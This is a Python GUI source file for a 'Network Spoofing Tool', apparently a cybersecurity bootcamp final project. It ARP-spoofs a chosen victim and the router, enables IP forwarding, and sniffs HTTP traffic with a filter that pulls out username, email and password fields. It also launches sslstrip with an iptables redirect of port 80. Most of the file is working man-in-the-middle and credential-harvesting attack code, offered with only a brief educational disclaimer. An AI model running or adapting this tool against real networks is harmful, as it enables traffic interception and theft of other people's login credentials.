#!/usr/bin/python
#
# 
# Author: Karma Tobgyel
# This material is intended for educational 
# purposes only and the author can not be held liable for 
# any kind of damages done whatsoever to your machine, 
# or damages caused by some other,creative application of this material.
# In any case you disagree with the above statement,stop here.


from tkinter import *
from tkinter import ttk
import time
import threading

import platform
from tkinter import messagebox
import re
import scapy.all as scapy
import scapy_http.http as http
import ctypes
import os
import subprocess
import socket, struct
import signal
import functions


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# def stop_sniff():
#     if run_sniff:
#         return True
#     else:
#         return False


def get_url(packet):
    # capturing the urls in the visiting site
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url.decode()


def get_user_data(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        field_keywords = ["username", "user_name" "email", "login", "pass", "password"]
        for keyword in field_keywords:
            if keyword.encode() in load:
                return "Request URL >> " + get_url(packet) + "\n" + load.decode() + "\n"


def hello():
    print("Nothing")


def open_about():
    aboutWin = Toplevel(root)
    aboutWin.wm_geometry("550x400")

    lbl1 = Label(aboutWin, text="Net Tools")
    lbl1.pack(side=TOP, padx=10, anchor=W)
    lbl1.config(font=("Courier", 30))
    lbl2 = Label(aboutWin, text="Version: 1.0")
    lbl2.pack(side=TOP, padx=10, anchor=W)
    lbl2.config(font=("Courier", 16))
    lbl1.config(font=("Courier", 16))
    lbl_about = Label(aboutWin, text="Author: Karma Tobgyel", fg="orange")
    lbl_about.pack(side=TOP, padx=10, anchor=W)
    lbl_about.config(font=("Courier", 16))

    lbl3 = Label(aboutWin, fg="blue", text="This tool is created as part  of UCLA \nCybersecurity bootcamp final project")
    lbl3.pack(side=TOP, padx=10, pady=10, anchor=W)
    lbl3.config(font=("Courier", 14))


def is_ip(ip):
    ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    vali = ip_pattern.match(ip)
    if vali:
        return True
    else:
        return  False


def open_help():
    helpWin = Toplevel(root)
    lbl1 = Label(helpWin, text="COMING SOON")
    lbl1.pack(side=TOP, padx=10, pady=10, anchor=W)


def process_sniffed_packet(packet):
    global run_sniff
    if not run_sniff:
        return

    global cboxValue
    insertData = ""
    try:
        if cboxValue.get() == 0:
            insertData = packet
        else:
            if packet.haslayer(http.HTTPRequest):
                url = get_url(packet)
                user_data = get_user_data(packet)
                if str(user_data)!="None":
                    insertData = str(user_data)
    except:
        print('data error')

    if len(str(insertData)):
        pkt_txt.insert(END, str(insertData))


def start_sniff():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True )
    sniff(listen_if_entry.get())


def spoof_arp():
    lbl_packet_sent_msg.pack(side=TOP, pady=15)
    packet_count=0
    global run_spoof

    # show the data on the new windows
    while run_spoof:
        # # router
        vip =  victim_ip_entry.get()
        rip = router_ip_entry.get()
        functions.arp_spoof(vip, rip)
        functions.arp_spoof(rip, vip)

        packet_count += 2
        lbl_packet_sent_msg.config(text="[+] Packet sent: " + str(packet_count))
        print("[+] Packet sent: " + str(packet_count))
        time.sleep(1)
        if not run_spoof:
            break


def stop_spoof():
    stop_spoof_btn.config(state = DISABLED)
    start_spoof_btn.config(state = NORMAL)

    global run_spoof
    global run_sniff
    run_sniff = False
    run_spoof = False

    vip = victim_ip_entry.get()
    rip = router_ip_entry.get()

    # restoring the original mac address
    functions.arp_spoof_restore(vip, rip)
    functions.arp_spoof_restore(rip, vip)
    # stop packet forwarding

    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)

    # reopening window becasue the multi threading won't work for now
    # os.execl(sys.executable, sys.executable, *sys.argv)


def run_spoof_now():
    # check if the ips are nut nul
    if router_ip_entry.get()=="":
        messagebox.showerror("IP Error", "Enter Router IP Address")
        return
    elif router_ip_entry.get():

        if not is_ip(router_ip_entry.get()):
            messagebox.showerror("Invalid Error", "Invalid Router IP Address")
            return

    if victim_ip_entry.get()=="":
        messagebox.showerror("IP Error", "Enter Victim IP Address")
        return
    elif victim_ip_entry.get():

        if not is_ip(victim_ip_entry.get()):
            messagebox.showerror("Invalid Error", "Invalid Victim's IP Address")
            return
    if router_ip_entry.get() == victim_ip_entry.get():
        messagebox.showerror("IP Error", "Router and Victim IP Cannot be Same")
        return

    if listen_if_entry.get() == "":
        messagebox.showerror("Interface Error", "Select Interface to Listion on")
        return
    elif listen_if_entry.get():
        if listen_if_entry.get() not in interface_names:
            messagebox.showerror("Invalid", "Interface name is not found in this system")
            return

    stop_spoof_btn.config(state=NORMAL)
    start_spoof_btn.config(state=DISABLED)
    global process
    global process2
    global run_spoof
    global run_sniff
    run_sniff = True
    run_spoof = True
    process = threading.Thread(target=spoof_arp)
    process.daemon = True
    process2 = threading.Thread(target=start_sniff)
    process.start()
    process2.daemon = True
    process2.start()
    open_sniff_window()


def treeview_get_data():
    net_list = functions.get_all_host_in_current_network()
    for row, ele in enumerate(net_list, start=1):
        hostTv.insert("", "end", text="host", values=(str(row), ele["ip"], ele["mac"]), tags="data")


def remove_all_item_treeview():
    for item in hostTv.get_children():
        hostTv.delete(item)


def treeview_refresh():
    remove_all_item_treeview()
    treeview_get_data()
    print(victim_ip_entry.focus_get())


def select_intf(event):
    w = event.widget
    index = int(w.curselection()[0])
    value = w.get(index)
    listen_if.set(value)


def win_close():
    # messagebox.showerror("haha", "good bye")
    root.destroy()
    # print("DONE")

def sniff_win_close():
    # if messagebox.askokcancel("Closing", "Are you sure you want to quite on me?"):
    global sniffWindow
    sniffWindow.destroy()
    stop_spoof()
    # stop_sniff()
    # redeclare
    sniffWindow = Toplevel(root)
    sniffWindow.withdraw()
    sniffWindow.wm_protocol("WM_DELETE_WINDOW", sniff_win_close)


def open_sniff_window():
    global sniffWindow
    # sniffWindow = Toplevel(root)
    sniffWindow.update()
    sniffWindow.deiconify()
    sniffWindow.wm_geometry("500x500")
    sniffWindow.title(" ")

    slbl = Label(sniffWindow, text="Packet sniffing in progress... ", fg="blue")
    slbl.config(font=("Courier", 15))

    slbl.pack(side=TOP)
    sbar = Scrollbar(sniffWindow)
    sbar.pack(side=RIGHT, fill=Y)
    global pkt_txt
    pkt_txt = Text(sniffWindow, wrap=WORD, relief=FLAT)
    pkt_txt.pack(expand=1, fill=BOTH)
    pkt_txt.config(yscrollcommand=sbar.set)
    sbar.config(command=pkt_txt.yview)




def on_treeview_click(event):
    global ipFocus
    srow = hostTv.focus()
    srow_dict = hostTv.item(srow)
    root.clipboard_clear()
    root.clipboard_append(srow_dict["values"][1])
    # messagebox.showinfo("Clipboard", "Copied to clipboard, click on router or vicitm ip input text to paste it in")

    if not len(ipFocus):
        messagebox.showinfo("No Selection", "Click on Router or Victim's IP Input box")
        return

    if len(ipFocus):
        if ipFocus == "rip":
            router_ip.set(srow_dict["values"][1])

        if ipFocus == "vip":
            victim_ip.set(srow_dict["values"][1])


def vip_focus(event):
    global ipFocus
    ipFocus = "vip"


def routerip_focus(event):
    global ipFocus
    ipFocus="rip"


def open_disclaimerWin():
    discWin = Toplevel(root)
    discWin.wm_geometry("510x500")
    # discFrame = Frame(discWin)
    lbld = Label(discWin, text="DISCLAIMER", fg="blue")
    lbld.pack()

    lbld_txt = Label(discWin, justify=LEFT, anchor=W, wraplength=490, relief=GROOVE)
    lbld_txt.pack(ipadx=10, ipady=10, pady=6, padx=6)
    # opne a text file and get it.
    dfile = os.getcwd() + "/disclaimer.txt"
    df = open(dfile, "r")

    lbld_txt['text'] = df.read()
# def change_sniff():


def enable_sslStrip():
    try:
        global sslProccess
        subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000",
                        shell=True)
        sslProccess = subprocess.Popen("sslstrip", shell=True)
    except:
        print("SSL NO GOOD")


def disable_sslStrip():
    try:
        subprocess.call("iptables -F", shell=True)
        subprocess.call("iptables -t nat -F", shell=True)
        subprocess.call("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)
        # os.system("iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
        # subprocess.call("sslstrip.py -l 10000", shell=True)
        global sslProccess
        os.kill(sslProccess.pid, signal.SIGINT)
        subprocess.call("killall sslstrip", shell=True)
    except:
        print('no process to end')


def run_stop_ssl():

    global run_ssl
    print(str(run_ssl.get()))
    if run_ssl.get():
        # try:
        #     subprocess.call("killall sslscript", shell=True)
        # except:
        #     print("No sslscript running")

        # print('Running ssl')
        # enable_sslStrip()

        messagebox.showinfo("SSLStrip", "To run sslstrip open terminal and enter the following command\niptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000\n sslstrip")
    else:
        print('Stopping ssl')
        disable_sslStrip()



root = Tk()
osName = platform.system()

rightFrame = Frame(root)
rightFrame.pack(side=RIGHT, anchor=N, pady=8)
leftFrame = Frame(root)
# leftFrame.winfo_geometry("200x350")
leftFrame.pack(side=LEFT, anchor=N, pady=8)

topFrame = Frame(root)
topFrame.pack(side=TOP)

bottomFrame = Frame(root)
bottomFrame.pack(side=BOTTOM)
listen_if = StringVar()
run_spoof = True
run_sniff=True

ipFocus = "" # to check which entry box is selected.


process = threading.Thread(target=spoof_arp)
process2 = threading.Thread(target=start_sniff)

sslProccess = None

pkt_lbox = Listbox()
# pkt_lbox.insert(END, "ZEROOOO")
pkt_txt = Text()

sniffWindow = Toplevel(root)
sniffWindow.withdraw()
sniffWindow.wm_protocol("WM_DELETE_WINDOW", sniff_win_close)


#MENU BAR
menubar = Menu(root)
# create a pulldown menu, and add it to the menu bar
filemenu = Menu(menubar, tearoff=0)
filemenu.add_command(label="Save Interfaces", command=hello)
filemenu.add_command(label="Save Host List", command=hello)
filemenu.add_separator()
filemenu.add_command(label="Save Packet as pcap File", command=hello)
filemenu.add_separator()
filemenu.add_command(label="Exit", command=root.quit)
menubar.add_cascade(label="File", menu=filemenu)


# create more pulldown menus
editmenu = Menu(menubar, tearoff=0)
editmenu.add_command(label="Cut", command=hello)
editmenu.add_command(label="Copy", command=hello)
editmenu.add_command(label="Paste", command=hello)
menubar.add_cascade(label="Edit", menu=editmenu)

helpmenu = Menu(menubar, tearoff=0)
helpmenu.add_command(label="About", command=open_about)
helpmenu.add_command(label="Help", command=open_help)
helpmenu.add_command(label="Exit", command=root.quit)
menubar.add_cascade(label="ABOUT", menu=helpmenu)

disclaimermenu = Menu(menubar, tearoff=0)
disclaimermenu.add_command(label="Disclaimer", command=open_disclaimerWin)
menubar.add_cascade(label="DISCLAMER", menu=disclaimermenu)


# display the menu
root.config(menu=menubar)

lbl_router_ip = Label(leftFrame, text="Router IP")
lbl_router_ip.grid(row=1, column=0,  sticky=W, padx=5)

router_ip = StringVar()
# router_ip.set("10.0.2.1")
router_ip_entry = Entry(leftFrame, textvariable=router_ip, width=45)
router_ip_entry.grid(row=2, column=0, sticky=W, padx=5)
router_ip_entry.bind("<FocusIn>", routerip_focus)

lbl_victim_ip = Label(leftFrame, text="Victim IP")
lbl_victim_ip.grid(row=3, column=0,  sticky=W, padx=5)

victim_ip = StringVar()
# victim_ip.set("10.0.2.6")
victim_ip_entry = Entry(leftFrame, textvariable=victim_ip, width=45)
victim_ip_entry.grid(row=4, column=0, sticky=W, padx=5)
victim_ip_entry.bind("<FocusIn>", vip_focus)

lbl_if = Label(leftFrame, text="Interface Name to Listen On")
lbl_if.grid(row=5, column=0,  sticky=W, padx=5)


listen_if_entry = Entry(leftFrame, textvariable=listen_if, width=45)
listen_if_entry.grid(row=6, column=0, sticky=W, padx=5)

btnFrame = Frame(root)

start_spoof_btn = Button(btnFrame, text="START SPOOF", bg="red", fg="white", command=run_spoof_now, cursor="spider")
# start_spoof_btn.grid(row=7, column=0, sticky=W, pady=5)
start_spoof_btn.pack(side=LEFT)
stop_spoof_btn = Button(btnFrame, text="STOP SPOOF", bg="orange", fg="white", command=stop_spoof, cursor="target")
stop_spoof_btn.config(state=DISABLED)
stop_spoof_btn.pack(side=LEFT)


run_ssl = IntVar()
cbox_sslstrip = Checkbutton(btnFrame, text="Run SSLStrip", variable = run_ssl, command=run_stop_ssl)
cbox_sslstrip.pack()

cboxFrame = Frame(root)
cboxFrame.place(x=5, y=175)
cboxValue = IntVar()
cboxValue.set(1)
fterCheckBtn = Checkbutton(cboxFrame, text="Filter Only User Credential", variable=cboxValue)
fterCheckBtn.pack(side=LEFT, anchor=W)

packetSentFrame = Frame(root)


if osName == "Windows":
    btnFrame.place(x=5, y=133)
    packetSentFrame.place(x=5, y=160)
else:
    btnFrame.place(x=5, y=143)
    packetSentFrame.place(x=5, y=195)



lbl_packet_sent_msg = Label(packetSentFrame, text="[+] Packet sent: 0", fg="red")
lbl_packet_sent_msg.pack_forget()

lbl_host = Label(rightFrame, text="HOST LIST ON YOUR NETWORK")
lbl_host.pack(side=TOP)

treeFrame = Frame(rightFrame)
treeFrame.pack(side=TOP)

hostTv = ttk.Treeview(treeFrame, show="headings", selectmode='browse')
hostTv["columns"] = ("one", "two", "three")
hostTv.column("one", width=30, stretch=YES, anchor=W)
hostTv.column("two", width=120, stretch=YES, anchor=W)
hostTv.column("three", width=150, stretch=YES, anchor=W)

hostTv.heading("one", text=" ")
hostTv.heading("two", text="IP", anchor=W)
hostTv.heading("three", text="Mac Address", anchor=W)

vsb = ttk.Scrollbar(treeFrame, orient="vertical", command=hostTv.yview)
vsb.pack(side='right', fill='y')
hostTv.configure(yscrollcommand=vsb.set)
hostTv.pack(expand=YES, fill=BOTH, side=TOP)
hostTv.bind("<Double-1>", on_treeview_click)
treeview_get_data()

gatewayFrame = Frame(rightFrame)
gatewayFrame.pack(side=TOP)
glbl = Label(gatewayFrame, fg="white", bg="black")
glbl.pack()
glbl['text'] = "Possible Router IP: " + str(functions.get_gateway_ip())

hostBtnFrame = Frame(rightFrame)
hostBtnFrame.pack(side=TOP)
referesh_treeview_btn = Button(hostBtnFrame, text="Refresh Host List", command=treeview_refresh, bg="green", fg="white")
referesh_treeview_btn.pack(side=LEFT, pady=5)

lblClipboardMsg = Label(rightFrame, text="To copy the ip address into router/victim ip input box, \nclick in the input and double click the ip from the host lost list", bg="blue", fg="yellow")
lblClipboardMsg.pack(side=TOP, anchor=W, ipady=5, ipadx=5, pady=5, padx=5)


#listbox for interface names
lbFrame = Frame(root)
lbFrame.place(x=45, y=255)

lbl_interface = Label(lbFrame, text="Interface found on this system")
lbl_interface.pack(side=TOP)
lbox = Listbox(lbFrame)
lbox.config(width=30, height=5)
lbox.pack(side=LEFT, fill=Y)
lb_scrollbar = Scrollbar(lbFrame, orient="vertical")
lb_scrollbar.config(command=lbox.yview)
lb_scrollbar.pack(side="right", fill="y")
lbox.bind('<<ListboxSelect>>', select_intf)
interface_names = []

if osName == "Windows":
    for ethName in functions.get_interface_names():
        if not ethName["name"]=="":
            lbox.insert(END, ethName["name"])
            interface_names.append(ethName["name"])

if osName == "Linux":
    for ethName in functions.get_interface_names():
        if ethName[1]:
            lbox.insert(END, ethName)
            interface_names.append(ethName)

print(interface_names)
if platform.system()=="Windows":
    root.geometry("580x500")
else:
    root.geometry("800x650")


root.resizable(width=0, height=0)
root.title("Network Spoofing Tool")

root.protocol("WM_DELETE_WINDOW", win_close)

root.mainloop()
